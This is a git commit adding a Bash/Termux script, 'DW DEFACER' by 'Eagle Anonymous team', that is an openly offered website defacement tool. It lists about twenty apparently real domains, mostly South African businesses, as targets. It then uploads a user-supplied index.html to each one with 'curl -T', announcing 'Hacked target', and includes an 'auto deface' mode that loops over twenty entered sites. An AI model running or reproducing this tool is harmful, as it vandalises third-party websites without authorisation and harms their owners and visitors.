77d1b936f6da41bbf99b6d89f685b4b7e653ae2c
EAGLE ANONYMOUS <58801545+EAGLEANONYMOUS@users.noreply.github.com>
2019-12-28 19:13:22 +0800

    i.sh

---
+++ i.sh
@@ -0,0 +1,285 @@
+#Gila_coding
+green="\033[32;1m"
+yellow="\033[33;1m"
+indigo="\033[34;1m"
+red="\033[35;1m"
+purple="\033[37;1m"
+cyan="\033[36;1m"
+white="\033[39;1m"
+pkg install toilet -y
+clear
+echo
+echo
+echo
+echo
+echo
+echo
+echo
+toilet -f future "    DW DEFACER" | lolcat
+echo
+echo $red">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
+echo $red
+figlet -f future "Eagle Anonymous team"
+echo
+echo $red">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
+echo
+echo $red"	~"$cyan"{"$white"A"$cyan"}"$green"."$yellow"Tebas Index Website"$cyan
+echo $red"        ~"$cyan"{"$white"B"$cyan"}"$green"."$yellow"Follow admin"$cyan
+echo $red"	~"$cyan"{"$white"C"$cyan"}"$green"."$yellow"Auto Deface Website"$cyan
+echo
+echo $red"＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿"
+echo
+echo $white"  +"$cyan"{"$white"T"$cyan"}"$purple"."$green"TUTORIAL & LIVE TARGET"$indigo"      +"$cyan"{"$white"I"$cyan"}"$green"Info"$indigo"      +"$cyan"{"$white"Q"$cyan"}"$green"Quit"$cyan
+echo $white"＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿"
+echo $white"=============================================================="
+echo
+echo $white "╭─"$yellow"Dw"$cyan" ~/Dw"$white
+read -p " ╰─$ "  apaan
+echo
+if [ $apaan = "A" ] || [ $apaan = "a" ]
+then
+echo
+echo
+echo
+clear
+echo
+echo
+echo
+echo
+toilet -f future "Tebas Index website" | lolcat
+echo
+echo $red "Simpan script deface di /sdcard "
+echo
+echo $red "List Target"
+echo $red "http://contsol.co.za"
+echo $red "http://colourfactory.co.za"
+echo $red "http://chillibitez.co.za"
+echo $red "http://chasingfantasia.com"
+echo $red "http://centraltech.co.za"
+echo $red "http://cblandscapes.co.za"
+echo $red "http://crimsonmonkeyweb.com"
+echo $red "http://kevinbutho.com"
+echo $red "http://prorepafrica.com"
+echo $red "http://xposurephotography.co.za"
+echo $red "http://windmillsandporcupines.co.za"
+echo $white "http://tcnig.co.za"
+echo $white "http://ayk.co.za"
+echo $white "http://thehellenic.co.za"
+echo $white "http://valdicare.co.za"
+echo $white "http://scnc.co.za"
+echo $white "http://bitsandpieces.co.za"
+echo $white "http://itsengineering.co.za"
+echo $white "http://windmillsandporcupines.co.za"
+echo $white "http://floralandfresh.co.za"  
+echo
+echo $white "Masukan web target"
+echo $green "╭─"$red"DwDefacer"$white" ~/load"$white
+read -p " ╰─$ "  target
+echo
+echo $red "Masukan script /sdcard "
+echo $green "╭─"$red"DwDefacer"$white" ~/Nama script harus index.html"$white
+read -p " ╰─$ "  script
+curl -T /storage/emulated/0/$script $target
+echo $red "["$red"Hacked target"$red"]"$red"～～～＞"$red" $target"
+echo
+echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
+read -p "[B/Q] : " back
+fi
+
+if [ $apaan = "B" ] || [ $apaan = "b" ]
+then
+xdg-open https://www.instagram.com/_dewabaskara_10/
+read -p "[B/Q] : " back
+fi
+
+if [ $apaan = "C" ] || [ $apaan = "c" ]
+then
+echo
+echo
+echo
+clear
+echo
+echo
+echo
+echo $red
+toilet -f future "Deface Auto" | lolcat
+echo $cyan "Website added 20"
+echo
+echo
+echo
+echo
+echo "Masukan Script...."
+echo $white "╭─"$green"Dw"$cyan" ~/Dw"$white                               
+read -p " ╰─$ " script
+echo
+echo
+echo $white"Masukan Target1 !!!!"
+echo $white "╭─"$green"Dw"$cyan" ~/Dw"$white
+read -p " ╰─$ " target1
+curl -T /storage/emulated/0/$script $target1
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target1/$script"
+echo
+echo $white"Masukan Target2 !!!!"
+echo $white "╭─"$green"Dw"$cyan" ~/Dw"$white
+read -p " ╰─$ " target2
+curl -T /storage/emulated/0/$script $target2
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target2/$script"
+echo
+echo $white"Masukan Target3 !!!!"
+echo $white "╭─"$green"Dw"$cyan" ~/Dw"$white
+read -p " ╰─$ " target3
+curl -T /storage/emulated/0/$script $target3
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target3/$script"
+echo
+echo $white"Masukan Target4 !!!!"
+echo $white "╭─"$green"Dw"$cyan" ~/Dw"$white
+read -p " ╰─$ " target4
+curl -T /storage/emulated/0/$script $target4
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target4/$script"
+echo
+echo $white"Masukan Target5 !!!!"
+echo $white "╭─"$green"Dw"$cyan" ~/Crot"$white
+read -p " ╰─$ " target5
+curl -T /storage/emulated/0/$script $target5
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target5/$script"
+echo
+echo $white"Masukan Target6 !!!!"
+echo $white "╭─"$green"Dw"$cyan" ~/Crot"$white
+read -p " ╰─$ " target6
+curl -T /storage/emulated/0/$script $target6
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target6/$script"
+echo
+echo $white"Masukan Target7 !!!!"
+echo $white "╭─"$green"Dw"$cyan" ~/Dw"$white
+read -p " ╰─$ " target7
+curl -T /storage/emulated/0/$script $target7
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target7/$script"
+echo
+echo $white"Masukan Target8 !!!!"
+echo $white "╭─"$green"Dw"$cyan" ~/Crot"$white
+read -p " ╰─$ " target8
+curl -T /storage/emulated/0/$script $target8
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target8/$script"
+echo
+echo $white"Masukan Target9 !!!!"
+echo $white "╭─"$green"Dw"$cyan" ~/Dw"$white
+read -p " ╰─$ " target9
+curl -T /storage/emulated/0/$script $target9
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target9/$script"
+echo
+echo $white"Masukan Target10 !!!! "
+echo $white "╭─"$green"Dw"$cyan" ~/Crot"$white
+read -p " ╰─$ " target10
+curl -T /storage/emulated/0/$script $target10
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target10/$script"
+echo
+echo $white"Masukan Target11 !!!! "
+echo $white "╭─"$green"Dw"$cyan" ~/Dw"$white
+read -p " ╰─$ " target11
+curl -T /storage/emulated/0/$script $target11
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target11/$script"
+echo
+echo $white"Masukan Target12 !!!! "
+echo $white "╭─"$green"Dw"$cyan" ~/Crot"$white
+read -p " ╰─$ " target12
+curl -T /storage/emulated/0/$script $target12
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target12/$script"
+echo
+echo $white"Masukan Target13 !!!! "
+echo $white "╭─"$green"Dw"$cyan" ~/Dw"$white
+read -p " ╰─$ " target13
+curl -T /storage/emulated/0/$script $target13
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target13/$script"
+echo
+echo $white"Masukan Target14 !!!! "
+echo $white "╭─"$green"Dw"$cyan" ~/Crot"$white
+read -p " ╰─$ " target14
+curl -T /storage/emulated/0/$script $target14
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target14/$script"
+echo
+echo $white"Masukan Target15 !!!! "
+echo $white "╭─"$green"Dw"$cyan" ~/Dw"$white
+read -p " ╰─$ " target15
+curl -T /storage/emulated/0/$script $target15
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target15/$script"
+echo
+echo $white"Masukan Target16 !!!! "
+echo $white "╭─"$green"Dw"$cyan" ~/Crot"$white
+read -p " ╰─$ " target16
+curl -T /storage/emulated/0/$script $target16
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target16/$script"
+echo
+echo $white"Masukan Target17 !!!! "
+echo $white "╭─"$green"Dw"$cyan" ~/Dw"$white
+read -p " ╰─$ " target17
+curl -T /storage/emulated/0/$script $target17
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target17/$script"
+echo
+echo $white"Masukan Target18 !!!! "
+echo $white "╭─"$green"Dw"$cyan" ~/Crot"$white
+read -p " ╰─$ " target18
+curl -T /storage/emulated/0/$script $target18
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target18/$script"
+echo
+echo $white"Masukan Target19 !!!! "
+echo $white "╭─"$green"Dw"$cyan" ~/Dw"$white
+read -p " ╰─$ " target19
+curl -T /storage/emulated/0/$script $target19
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target19/$script"
+echo
+echo $white"Masukan Target20 !!!! "
+echo $white "╭─"$green"Dw"$cyan" ~/Crot"$white
+read -p " ╰─$ " target20
+curl -T /storage/emulated/0/$script $target20
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target20/$script"
+echo
+echo
+echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
+read -p "[B/Q] : " back
+fi
+
+if [ $apaan = "I" ] || [ $apaan = "i" ]
+then
+echo
+echo
+echo
+clear
+echo
+echo
+echo
+echo
+toilet -f future "   Informasi Tools" | lolcat
+echo $red"##########################$green" WELCOME "$red###########################"
+echo $red"Author   : Dw			"
+echo $purple"Gthub   : https://github.com/LenteraHacker"
+echo $white"Youtube  : https://youtube.com/EagleAnonymous"
+echo
+echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
+read -p "[B/Q] " back
+fi
+
+if [ $apaan = "T" ] || [ $apaan = "t" ]
+then
+echp $red "bacot nub anda memang"
+echo
+echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
+read -p "[B/Q] " back
+fi
+
+if [ $apaan = "Q" ] || [ $apaan = "q" ]
+then
+echo " Thanks mamank "
+exit
+clear
+fi
+
+
+if [ $back = "B" ] || [ $back = "b" ]
+then
+sh DEFACEDZ.sh
+fi
+
+if [ $back = "Q" ] || [ $back = "q" ]
+then
+clear
+fi
